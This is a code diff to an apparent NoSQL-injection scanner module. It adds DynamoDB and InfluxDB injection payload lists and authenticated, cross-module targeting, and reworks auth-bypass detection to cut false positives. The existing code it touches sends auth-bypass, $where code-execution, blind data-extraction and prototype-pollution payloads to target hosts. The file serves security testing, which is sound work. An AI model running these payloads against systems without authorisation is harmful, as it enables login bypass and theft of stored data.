@@ -26,10 +26,13 @@ from typing import TYPE_CHECKING, Any
 
 import httpx
 
-from scanning.vuln_scanner import Finding, ScanModule
+from scanning.findings import Finding
+from scanning.vuln_scanner import ScanModule
+from scanning.scan_context import ScanContext
 from utils.endpoint_map import EndpointMap, EndpointCategory
 from utils.endpoint_validator import EndpointValidator
 from utils.logger import get_logger
+from utils.scan_client import get_scan_client
 from utils.rate_limiter import RateLimiter
 from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
 
@@ -569,7 +572,34 @@ class NoSQLPayloads:
         "') OR true OR ('",
         "' LET x=1 RETURN x //",
     ]
-    
+
+    # FN-M9 FIX: DynamoDB PartiQL injection
+    DYNAMODB_PAYLOADS = [
+        # PartiQL injection
+        "' OR 'a'='a",
+        '" OR "a"="a',
+        "' OR ''='",
+        # Expression attribute names/values
+        '{"#n": {"S": "admin"}}',
+        '{"TableName": "users"}',
+        # Filter expression injection
+        "' AND begins_with(password, 'a')",
+        "' OR attribute_exists(admin)",
+        # Scan/Query projection
+        '{"ProjectionExpression": "password, api_key"}',
+    ]
+
+    # FN-M9 FIX: InfluxDB Flux injection
+    INFLUXDB_PAYLOADS = [
+        # Flux query injection
+        'from(bucket: "db") |> range(start: -1y)',
+        ') |> yield(name: "_results")',
+        '|> drop(columns: ["_time"])',
+        # InfluxQL legacy
+        "'; SHOW DATABASES; --",
+        "' OR '1'='1' --",
+    ]
+
     # =========================================================================
     # WAF BYPASS PAYLOADS
     # =========================================================================
@@ -880,9 +910,15 @@ class NoSQLScanner(ScanModule):
         "/graphql",
     ]
     
-    def __init__(self, settings: Settings) -> None:
-        super().__init__(settings)
-        self.timeout = settings.timeouts.request_timeout
+    def __init__(
+        self,
+        settings: Settings,
+        *,
+        findings_store: Any = None,
+        rate_limiter: Any = None,
+    ) -> None:
+        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
+        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
         self.payloads = NoSQLPayloads()
         self.time_threshold = 4.5  # seconds for time-based detection
         self.max_concurrent = 10
@@ -892,21 +928,78 @@ class NoSQLScanner(ScanModule):
         host: str,
         asset_data: dict[str, Any],
         rate_limiter: RateLimiter,
-    ) -> list[Finding]:
+    ) -> dict[str, Any]:
         """Scan for NoSQL injection vulnerabilities."""
         findings: list[Finding] = []
-        
+
         # Normalize URL
         base_url = self._normalize_url(host)
-        
+
+        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
+        self._ctx = ScanContext(asset_data)
+        self._ctx.log_context_status()
+        self._auth_headers = self._ctx.auth_headers
+        # PERF-FIX 2026-02-20: Store asset_data for intelligent payload selection
+        self._asset_data = asset_data
+
         logger.info(f"[NoSQL-GOD] Starting scan on {base_url}")
         logger.info(f"[NoSQL-GOD] Version: {self.version}")
-        
-        async with httpx.AsyncClient(
-            verify=False,
+        if self._ctx.has_auth:
+            logger.info(f"[NoSQL] Using authenticated session ({self._ctx.auth_method})")
+
+        # STACK PROFILE: Use NoSQL-database-specific payloads when available
+        if isinstance(asset_data, dict):
+            runtime_engine = asset_data.get("runtime_engine")
+        if isinstance(asset_data, dict):
+            stack_profile = asset_data.get("stack_profile")
+        self._stack_specific_payloads: list[str] = []
+        if runtime_engine and stack_profile:
+            try:
+                nosql_payloads = runtime_engine.get_nosql_payloads(stack_profile)
+                if nosql_payloads:
+                    self._stack_specific_payloads = nosql_payloads
+                    db_type = stack_profile.get("database", "unknown") if isinstance(stack_profile, dict) else getattr(stack_profile, "database", "unknown")
+                    logger.info(f"[NoSQL] Using {len(nosql_payloads)} stack-specific payloads for {db_type}")
+            except Exception as e:
+                logger.debug(f"[NoSQL] Could not get stack-specific payloads: {e}")
+
+        # TOOL DISCOVERED PARAMS: Test parameters found by arjun
+        if isinstance(asset_data, dict):
+            tool_discovered_params = asset_data.get("tool_discovered_params") or {}
+        self._arjun_endpoints: dict[str, list[str]] = {}
+        if tool_discovered_params:
+            self._arjun_endpoints = tool_discovered_params
+            logger.info(f"[NoSQL] Using {len(tool_discovered_params)} parameter sets discovered by arjun")
+
+        # GAP-A5 FIX 2026-02-18: Extract endpoints from asset_data
+        # Bug: Was only using hardcoded API_ENDPOINTS, not discovered endpoints!
+        if isinstance(asset_data, dict):
+            discovered_endpoints = asset_data.get("endpoints", [])
+        else:
+            discovered_endpoints = []
+        self._discovered_endpoints = discovered_endpoints
+        if discovered_endpoints:
+            logger.info(f"[NoSQL] Using {len(discovered_endpoints)} discovered endpoints from asset_data")
+
+        # SHARED FINDINGS STORE: Cross-module targeting
+        if isinstance(asset_data, dict):
+            shared_store = asset_data.get("shared_findings_store")
+        self._target_endpoints: list[str] = []
+        # Start with discovered endpoints
+        self._target_endpoints.extend(discovered_endpoints)
+        if shared_store:
+            from utils.shared_findings_store import VulnType
+            # NoSQL often works where SQLi is attempted but fails (different DB backend)
+            for vtype in [VulnType.SQL_INJECTION, VulnType.AUTH_BYPASS]:
+                for sf in shared_store.get_findings_by_type(vtype):
+                    if sf.endpoint:
+                        self._target_endpoints.append(sf.endpoint)
+                        logger.debug(f"[NoSQL] Cross-module target from {sf.module}: {sf.endpoint}")
+
+        async with get_scan_client(
             timeout=self.timeout,
-            follow_redirects=True,  # CRITICAL: Follow 301/302 redirects
-            max_redirects=5,
+            follow_redirects=True,
+            custom_headers=self._auth_headers,
         ) as client:
             # Get baseline response
             baseline = await self._get_baseline(client, base_url, rate_limiter)
@@ -916,20 +1009,33 @@ class NoSQLScanner(ScanModule):
             if waf_type != WAFType.NONE:
                 logger.info(f"[NoSQL-GOD] WAF detected: {waf_type.name}")
             
-            # Run all test modules
+            # TIMEOUT-FIX 2026-02-12: Wrap each test module with timeout
+            module_timeout = 30.0  # Max 30s per test module
+
+            async def run_with_timeout(coro, name: str):
+                try:
+                    return await asyncio.wait_for(coro, timeout=module_timeout)
+                except asyncio.TimeoutError:
+                    logger.debug(f"[NoSQL-GOD] {name} timeout after {module_timeout}s")
+                    return []
+                except Exception as e:
+                    logger.debug(f"[NoSQL-GOD] {name} error: {e}")
+                    return []
+
+            # Run all test modules with timeout protection
             scan_tasks = [
-                self._test_url_params(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_json_injection(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_auth_bypass(client, base_url, rate_limiter, waf_type),
-                self._test_where_injection(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_api_endpoints(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_blind_injection(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_aggregation_injection(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_error_based(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_prototype_pollution(client, base_url, baseline, rate_limiter, waf_type),
-                self._test_graphql_nosql(client, base_url, baseline, rate_limiter, waf_type),
+                run_with_timeout(self._test_url_params(client, base_url, baseline, rate_limiter, waf_type), "url_params"),
+                run_with_timeout(self._test_json_injection(client, base_url, baseline, rate_limiter, waf_type), "json_injection"),
+                run_with_timeout(self._test_auth_bypass(client, base_url, rate_limiter, waf_type), "auth_bypass"),
+                run_with_timeout(self._test_where_injection(client, base_url, baseline, rate_limiter, waf_type), "where_injection"),
+                run_with_timeout(self._test_api_endpoints(client, base_url, baseline, rate_limiter, waf_type), "api_endpoints"),
+                run_with_timeout(self._test_blind_injection(client, base_url, baseline, rate_limiter, waf_type), "blind_injection"),
+                run_with_timeout(self._test_aggregation_injection(client, base_url, baseline, rate_limiter, waf_type), "aggregation"),
+                run_with_timeout(self._test_error_based(client, base_url, baseline, rate_limiter, waf_type), "error_based"),
+                run_with_timeout(self._test_prototype_pollution(client, base_url, baseline, rate_limiter, waf_type), "prototype_pollution"),
+                run_with_timeout(self._test_graphql_nosql(client, base_url, baseline, rate_limiter, waf_type), "graphql"),
             ]
-            
+
             results = await asyncio.gather(*scan_tasks, return_exceptions=True)
             
             for result in results:
@@ -945,8 +1051,40 @@ class NoSQLScanner(ScanModule):
             findings = self._deduplicate_findings(findings)
         
         logger.info(f"[NoSQL-GOD] Scan complete. Found {len(findings)} vulnerabilities")
-        return findings
-    
+
+        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
+        try:
+            from utils.shared_findings_store import SharedFindingsStore, VulnType
+            store = SharedFindingsStore.get_instance()
+            for f in findings:
+                if isinstance(f, dict):
+                    metadata = f.get("metadata", {})
+                    await store.add_finding(
+                        {
+                            "type": VulnType.NOSQL_INJECTION,
+                            "endpoint": f.get("matched_at") or metadata.get("url", ""),
+                            "severity": f.get("severity", "HIGH"),
+                            "parameter": metadata.get("param") or metadata.get("vulnerable_param", ""),
+                            "database": metadata.get("database_type", ""),
+                        },
+                        module="nosql",
+                    )
+            if findings:
+                logger.debug(f"[NoSQL] Shared {len(findings)} findings to cross-module store")
+        except Exception as e:
+            logger.debug(f"[NoSQL] Could not share findings: {e}")
+
+        # Return dict with findings (standard interface)
+        findings_dicts = []
+        for f in findings:
+            if isinstance(f, dict):
+                findings_dicts.append(f)
+            elif hasattr(f, 'to_dict'):
+                findings_dicts.append(f.to_dict())
+            elif hasattr(f, '__dict__'):
+                findings_dicts.append(vars(f))
+        return {"findings": findings_dicts}
+
     def _normalize_url(self, host: str) -> str:
         """Normalize URL with proper scheme."""
         if not host.startswith(("http://", "https://")):
@@ -1017,32 +1155,62 @@ class NoSQLScanner(ScanModule):
     ) -> list[Finding]:
         """Test URL parameters for NoSQL injection."""
         findings: list[Finding] = []
-        
+
         parsed = urllib.parse.urlparse(base_url)
         existing_params = urllib.parse.parse_qs(parsed.query)
-        
+
         # Parameters to test
         params_to_test = list(existing_params.keys()) or self.NOSQL_PARAMS[:20]
-        
+
         for param in params_to_test:
-            # Test operator injection
-            for operator in self.payloads.MONGO_OPERATORS_BASIC[:15]:
-                result = await self._test_operator_in_param(
-                    client, base_url, param, operator,
-                    baseline, rate_limiter, waf_type
-                )
-                if result and result.vulnerable:
-                    findings.append(self._create_finding(result, base_url))
-            
-            # Test array injection
-            for array_payload in self.payloads.ARRAY_PAYLOADS[:10]:
-                result = await self._test_array_param(
-                    client, base_url, param, array_payload,
-                    baseline, rate_limiter, waf_type
-                )
-                if result and result.vulnerable:
-                    findings.append(self._create_finding(result, base_url))
-        
+            # PERF-FIX 2026-02-20: Try intelligent payload selection first
+            intelligent_payloads = await self._get_intelligent_payloads(
+                category="nosql",
+                endpoint=base_url,
+                param_name=param,
+                max_payloads=30,
+                asset_data=getattr(self, '_asset_data', None),
+            )
+
+            if intelligent_payloads:
+                # Use intelligent payloads - convert string payloads to operator dicts where possible
+                for payload_str, _effectiveness in intelligent_payloads[:20]:
+                    try:
+                        # Try to parse as JSON operator
+                        operator = json.loads(payload_str) if payload_str.startswith("{") else {"$ne": payload_str}
+                        result = await self._test_operator_in_param(
+                            client, base_url, param, operator,
+                            baseline, rate_limiter, waf_type
+                        )
+                        if result and result.vulnerable:
+                            findings.append(self._create_finding(result, base_url))
+                    except (json.JSONDecodeError, TypeError):
+                        # Not a JSON payload, try as array payload
+                        result = await self._test_array_param(
+                            client, base_url, param, payload_str,
+                            baseline, rate_limiter, waf_type
+                        )
+                        if result and result.vulnerable:
+                            findings.append(self._create_finding(result, base_url))
+            else:
+                # Fallback: Test operator injection with default payloads
+                for operator in self.payloads.MONGO_OPERATORS_BASIC[:15]:
+                    result = await self._test_operator_in_param(
+                        client, base_url, param, operator,
+                        baseline, rate_limiter, waf_type
+                    )
+                    if result and result.vulnerable:
+                        findings.append(self._create_finding(result, base_url))
+
+                # Test array injection
+                for array_payload in self.payloads.ARRAY_PAYLOADS[:10]:
+                    result = await self._test_array_param(
+                        client, base_url, param, array_payload,
+                        baseline, rate_limiter, waf_type
+                    )
+                    if result and result.vulnerable:
+                        findings.append(self._create_finding(result, base_url))
+
         return findings
     
     async def _test_operator_in_param(
@@ -1088,7 +1256,7 @@ class NoSQLScanner(ScanModule):
                     payload=payload_str,
                     parameter=param,
                     evidence=evidence,
-                    confidence=confidence,
+                    confidence_score=confidence,
                     response_time=elapsed,
                     status_code=response.status_code,
                     waf_detected=waf_type,
@@ -1135,16 +1303,17 @@ class NoSQLScanner(ScanModule):
                     payload=array_payload,
                     parameter=param,
                     evidence=evidence,
-                    confidence=confidence,
+                    confidence_score=confidence,
                     response_time=elapsed,
                     status_code=response.status_code,
                     waf_detected=waf_type,
                 )
-        except Exception:
-            pass
-        
+        except Exception as e:
+            # FIX 2026-02-12: Log suppressed errors for audit trail
+            logger.warning(f"[NoSQL] Error in URL test: {e}")
+
         return None
-    
+
     # =========================================================================
     # JSON BODY INJECTION
     # =========================================================================
@@ -1159,17 +1328,36 @@ class NoSQLScanner(ScanModule):
     ) -> list[Finding]:
         """Test JSON body injection."""
         findings: list[Finding] = []
-        
+
         headers = {"Content-Type": "application/json"}
-        
-        for payload in self.payloads.JSON_PAYLOADS[:20]:
+
+        # PERF-FIX 2026-02-20: Try intelligent payload selection first
+        intelligent_payloads = await self._get_intelligent_payloads(
+            category="nosql",
+            endpoint=base_url,
+            param_name="json_body",
+            max_payloads=30,
+            asset_data=getattr(self, '_asset_data', None),
+        )
+
+        # Build payload list: intelligent first, then fallback
+        if intelligent_payloads:
+            payloads_to_test = [p[0] for p in intelligent_payloads[:20]]
+            # Add some fallback payloads if we have room
+            remaining = 30 - len(payloads_to_test)
+            if remaining > 0:
+                payloads_to_test.extend(self.payloads.JSON_PAYLOADS[:remaining])
+        else:
+            payloads_to_test = self.payloads.JSON_PAYLOADS[:20]
+
+        for payload in payloads_to_test:
             await rate_limiter.acquire()
-            
+
             try:
                 # Try different fields
                 for field in ["username", "email", "query", "search", "id"]:
                     json_body = {field: json.loads(payload) if payload.startswith("{") else payload}
-                    
+
                     start = time.time()
                     response = await client.post(
                         base_url,
@@ -1177,14 +1365,14 @@ class NoSQLScanner(ScanModule):
                         headers=headers,
                     )
                     elapsed = time.time() - start
-                    
+
                     if WAFDetector.is_blocked(response):
                         continue
-                    
+
                     is_vuln, evidence, confidence = self._analyze_response(
                         response, baseline, elapsed, payload
                     )
-                    
+
                     if is_vuln:
                         db_type = DatabaseFingerprinter.fingerprint(response)
                         result = InjectionResult(
@@ -1194,18 +1382,20 @@ class NoSQLScanner(ScanModule):
                             payload=payload,
                             parameter=field,
                             evidence=evidence,
-                            confidence=confidence,
+                            confidence_score=confidence,
                             response_time=elapsed,
                             status_code=response.status_code,
                             waf_detected=waf_type,
                         )
                         findings.append(self._create_finding(result, base_url))
                         break  # Found vuln, move to next payload
-            except Exception:
+            except Exception as e:
+                # FN-H5 FIX: Log exceptions instead of swallowing
+                logger.debug(f"NoSQL injection test failed for {base_url}: {e}")
                 continue
-        
+
         return findings
-    
+
     # =========================================================================
     # AUTHENTICATION BYPASS
     # =========================================================================
@@ -1254,9 +1444,41 @@ class NoSQLScanner(ScanModule):
         headers = {"Content-Type": "application/json"}
 
         for endpoint in auth_endpoints:
-            for payload in self.payloads.AUTH_BYPASS_PAYLOADS[:15]:
+            # FP-FIX 2026-02-12: Establish baseline FIRST
+            baseline_response = await self._establish_auth_baseline(
+                client, endpoint, rate_limiter
+            )
+
+            # PERF-FIX 2026-02-20: Try intelligent payload selection first
+            intelligent_payloads = await self._get_intelligent_payloads(
+                category="nosql",
+                endpoint=endpoint,
+                param_name="auth_bypass",
+                max_payloads=20,
+                asset_data=getattr(self, '_asset_data', None),
+            )
+
+            # Build payload list: intelligent first, then fallback
+            if intelligent_payloads:
+                # Convert intelligent string payloads to dicts
+                payloads_to_test = []
+                for payload_str, _effectiveness in intelligent_payloads[:15]:
+                    try:
+                        parsed = json.loads(payload_str) if isinstance(payload_str, str) and payload_str.startswith("{") else None
+                        if parsed and isinstance(parsed, dict):
+                            payloads_to_test.append(parsed)
+                    except (json.JSONDecodeError, TypeError):
+                        pass
+                # Add fallback payloads if needed
+                remaining = 15 - len(payloads_to_test)
+                if remaining > 0:
+                    payloads_to_test.extend(self.payloads.AUTH_BYPASS_PAYLOADS[:remaining])
+            else:
+                payloads_to_test = self.payloads.AUTH_BYPASS_PAYLOADS[:15]
+
+            for payload in payloads_to_test:
                 await rate_limiter.acquire()
-                
+
                 try:
                     start = time.time()
                     response = await client.post(
@@ -1265,13 +1487,13 @@ class NoSQLScanner(ScanModule):
                         headers=headers,
                     )
                     elapsed = time.time() - start
-                    
+
                     if WAFDetector.is_blocked(response):
                         continue
-                    
-                    # Check for successful auth bypass
-                    is_bypass = self._check_auth_bypass(response)
-                    
+
+                    # FP-FIX: Check for auth bypass WITH baseline comparison
+                    is_bypass = self._check_auth_bypass(response, baseline_response)
+
                     if is_bypass:
                         db_type = DatabaseFingerprinter.fingerprint(response)
                         result = InjectionResult(
@@ -1280,20 +1502,32 @@ class NoSQLScanner(ScanModule):
                             database=db_type,
                             payload=json.dumps(payload),
                             parameter="authentication",
-                            evidence=f"Auth bypass successful. Status: {response.status_code}",
-                            confidence=90,
+                            evidence=f"Auth bypass successful. Status: {response.status_code}. Response differs from normal failed login.",
+                            confidence_score=90,
                             response_time=elapsed,
                             status_code=response.status_code,
                             waf_detected=waf_type,
                         )
                         findings.append(self._create_finding(result, endpoint))
-                except Exception:
+                except Exception as e:
+                    # FN-H5 FIX: Log exceptions
+                    logger.debug(f"Auth bypass test failed for {endpoint}: {e}")
                     continue
-        
+
         return findings
-    
-    def _check_auth_bypass(self, response: httpx.Response) -> bool:
-        """Check if authentication was bypassed."""
+
+    def _check_auth_bypass(
+        self,
+        response: httpx.Response,
+        baseline_response: httpx.Response | None = None,
+    ) -> bool:
+        """
+        Check if authentication was bypassed.
+
+        FP-FIX 2026-02-12: Added baseline comparison.
+        Before: Only checked for success patterns
+        After: Also compares against normal failed login to avoid FPs
+        """
         # Success indicators
         success_patterns = [
             r'"token":\s*"[^"]+"',
@@ -1308,21 +1542,84 @@ class NoSQLScanner(ScanModule):
             r'"admin":\s*true',
             r'"role":\s*"admin"',
         ]
-        
-        if response.status_code in [200, 201, 302]:
-            body = response.text.lower()
-            for pattern in success_patterns:
-                if re.search(pattern, body, re.IGNORECASE):
-                    return True
-            
-            # Check for session cookie
-            cookies = response.cookies
-            session_cookies = ["session", "sessionid", "sess", "auth", "token", "jwt"]
-            for cookie_name in session_cookies:
-                if cookie_name in str(cookies).lower():
-                    return True
-        
+
+        # Failure indicators - if these appear, NOT a bypass
+        failure_patterns = [
+            r'"error"',
+            r'"unauthorized"',
+            r'"invalid"',
+            r'"failed"',
+            r'"incorrect"',
+            r'"wrong"',
+            r'"denied"',
+            r'"forbidden"',
+        ]
+
+        if response.status_code not in [200, 201, 302]:
+            return False
+
+        body = response.text
+
+        # FP-FIX: If baseline provided, response must DIFFER from failed login
+        if baseline_response:
+            baseline_body = baseline_response.text
+            # If bodies are nearly identical (within 10%), not a real bypass
+            len_diff = abs(len(body) - len(baseline_body))
+            if len_diff < max(len(body), len(baseline_body)) * 0.1:
+                # Bodies similar length - check if content is also similar
+                if body[:500] == baseline_body[:500]:
+                    return False
+
+        # Check for failure patterns first - explicit failures are NOT bypasses
+        body_lower = body.lower()
+        for pattern in failure_patterns:
+            if re.search(pattern, body_lower):
+                return False
+
+        # Now check for success patterns
+        for pattern in success_patterns:
+            if re.search(pattern, body, re.IGNORECASE):
+                return True
+
+        # Check for session cookie
+        cookies = response.cookies
+        session_cookies = ["session", "sessionid", "sess", "auth", "token", "jwt"]
+        for cookie_name in session_cookies:
+            if cookie_name in str(cookies).lower():
+                return True
+
         return False
+
+    async def _establish_auth_baseline(
+        self,
+        client: httpx.AsyncClient,
+        endpoint: str,
+        rate_limiter: RateLimiter,
+    ) -> httpx.Response | None:
+        """
+        Establish baseline by sending a NORMAL failed login.
+
+        FP-FIX 2026-02-12: Get baseline response for comparison.
+        """
+        await rate_limiter.acquire()
+
+        try:
+            headers = {"Content-Type": "application/json"}
+            # Send clearly invalid credentials
+            invalid_login = {
+                "username": "nonexistent_user_12345",
+                "password": "wrong_password_67890",
+            }
+            response = await client.post(
+                endpoint,
+                json=invalid_login,
+                headers=headers,
+            )
+            logger.debug(f"[NoSQL-GOD] Auth baseline: status={response.status_code}, len={len(response.text)}")
+            return response
+        except Exception as e:
+            logger.debug(f"[NoSQL-GOD] Auth baseline error: {e}")
+            return None
     
     # =========================================================================
     # $WHERE INJECTION (JavaScript)
@@ -1405,16 +1702,17 @@ class NoSQLScanner(ScanModule):
                     payload=json.dumps(payload),
                     parameter="$where",
                     evidence=evidence,
-                    confidence=confidence,
+                    confidence_score=confidence,
                     response_time=elapsed,
                     status_code=response.status_code,
                     waf_detected=waf_type,
                 )
-        except Exception:
-            pass
-        
+        except Exception as e:
+            # FIX 2026-02-12: Log suppressed errors for audit trail
+            logger.warning(f"[NoSQL] Error in JSON injection test: {e}")
+
         return None
-    
+
     async def _test_where_time_based(
         self,
         client: httpx.AsyncClient,
@@ -1448,7 +1746,7 @@ class NoSQLScanner(ScanModule):
                     payload=payload,
                     parameter="$where",
                     evidence=f"Time-based detection: {elapsed:.2f}s delay (expected {expected_seconds}s)",
-                    confidence=85,
+                    confidence_score=85,
                     response_time=elapsed,
                     status_code=response.status_code,
                     waf_detected=waf_type,
@@ -1462,16 +1760,17 @@ class NoSQLScanner(ScanModule):
                 payload=payload,
                 parameter="$where",
                 evidence="Request timed out - possible time-based injection",
-                confidence=70,
+                confidence_score=70,
                 response_time=self.timeout,
                 status_code=0,
                 waf_detected=waf_type,
             )
-        except Exception:
-            pass
-        
+        except Exception as e:
+            # FIX 2026-02-12: Log suppressed errors for audit trail
+            logger.warning(f"[NoSQL] Error in time-based $where test: {e}")
+
         return None
-    
+
     async def _test_where_rce(
         self,
         client: httpx.AsyncClient,
@@ -1516,17 +1815,18 @@ class NoSQLScanner(ScanModule):
                         payload=json.dumps(payload),
                         parameter="$where",
                         evidence=f"RCE detected! Output contains: {pattern}",
-                        confidence=95,
+                        confidence_score=95,
                         response_time=elapsed,
                         status_code=response.status_code,
                         waf_detected=waf_type,
                         rce_possible=True,
                     )
-        except Exception:
-            pass
-        
+        except Exception as e:
+            # FIX 2026-02-12: Log suppressed errors for audit trail
+            logger.warning(f"[NoSQL] Error in $where RCE test: {e}")
+
         return None
-    
+
     # =========================================================================
     # BLIND INJECTION
     # =========================================================================
@@ -1596,17 +1896,18 @@ class NoSQLScanner(ScanModule):
                     payload=json.dumps(payload),
                     parameter="boolean_blind",
                     evidence=f"Boolean blind detected. True response: {len(response_true.text)} chars, False: {len(response_false.text)} chars",
-                    confidence=80,
+                    confidence_score=80,
                     response_time=0,
                     status_code=response_true.status_code,
                     waf_detected=waf_type,
                     can_extract_data=True,
                 )
-        except Exception:
-            pass
-        
+        except Exception as e:
+            # FIX 2026-02-12: Log suppressed errors for audit trail
+            logger.warning(f"[NoSQL] Error in blind boolean test: {e}")
+
         return None
-    
+
     def _responses_differ(self, r1: httpx.Response, r2: httpx.Response) -> bool:
         """Check if two responses are significantly different."""
         # Status code difference
@@ -1671,7 +1972,9 @@ class NoSQLScanner(ScanModule):
                             value += ch
                             found = True
                             break
-                    except Exception:
+                    except Exception as e:
+                        # FN-H5 FIX: Log extraction errors
+                        logger.debug(f"Blind extraction request failed: {e}")
                         continue
 
                 if not found:
@@ -1785,15 +2088,17 @@ class NoSQLScanner(ScanModule):
                             payload=json.dumps(payload),
                             parameter="POST body",
                             evidence=evidence,
-                            confidence=confidence,
+                            confidence_score=confidence,
                             response_time=0,
                             status_code=response.status_code,
                             waf_detected=waf_type,
                         )
                         findings.append(self._create_finding(result, full_url))
-            except Exception:
+            except Exception as e:
+                # FN-H5 FIX: Log exceptions
+                logger.debug(f"NoSQL test failed for {full_url}: {e}")
                 continue
-        
+
         return findings
     
     # =========================================================================
@@ -1843,17 +2148,19 @@ class NoSQLScanner(ScanModule):
                         payload=payload,
                         parameter="pipeline",
                         evidence=evidence,
-                        confidence=confidence,
+                        confidence_score=confidence,
                         response_time=elapsed,
                         status_code=response.status_code,
                         waf_detected=waf_type,
                     )
                     findings.append(self._create_finding(result, base_url))
-            except Exception:
+            except Exception as e:
+                # FN-H5 FIX: Log exceptions
+                logger.debug(f"Aggregation injection test failed: {e}")
                 continue
-        
+
         return findings
-    
+
     # =========================================================================
     # ERROR-BASED INJECTION
     # =========================================================================
@@ -1890,15 +2197,17 @@ class NoSQLScanner(ScanModule):
                         payload=payload,
                         parameter="error_based",
                         evidence=f"Database error leaked: {db_type.name}",
-                        confidence=75,
+                        confidence_score=75,
                         response_time=0,
                         status_code=response.status_code,
                         waf_detected=waf_type,
                     )
                     findings.append(self._create_finding(result, base_url))
-            except Exception:
+            except Exception as e:
+                # FN-H5 FIX: Log exceptions
+                logger.debug(f"Error-based injection test failed: {e}")
                 continue
-        
+
         return findings
     
     # =========================================================================
@@ -1949,16 +2258,18 @@ class NoSQLScanner(ScanModule):
                             payload=payload,
                             parameter="prototype",
                             evidence=f"Prototype pollution indicator: {indicator}",
-                            confidence=85,
+                            confidence_score=85,
                             response_time=0,
                             status_code=response.status_code,
                             waf_detected=waf_type,
                         )
                         findings.append(self._create_finding(result, base_url))
                         break
-            except Exception:
+            except Exception as e:
+                # FN-H5 FIX: Log exceptions
+                logger.debug(f"Prototype pollution test failed: {e}")
                 continue
-        
+
         return findings
     
     # =========================================================================
@@ -2016,17 +2327,19 @@ class NoSQLScanner(ScanModule):
                         payload=query,
                         parameter="graphql",
                         evidence=evidence,
-                        confidence=confidence,
+                        confidence_score=confidence,
                         response_time=0,
                         status_code=response.status_code,
                         waf_detected=waf_type,
                     )
                     findings.append(self._create_finding(result, graphql_endpoint))
-            except Exception:
+            except Exception as e:
+                # FN-H5 FIX: Log exceptions
+                logger.debug(f"GraphQL NoSQL test failed: {e}")
                 continue
-        
+
         return findings
-    
+
     # =========================================================================
     # RESPONSE ANALYSIS
     # =========================================================================
@@ -2175,7 +2488,7 @@ class NoSQLScanner(ScanModule):
             param=result.parameter,
             remediation=remediation,
             category="NoSQL Injection",
-            confidence=result.confidence,
+            confidence_score=result.confidence,
             scanner=self.name,
             scanner_version=self.version,
             cwe_id="CWE-943",
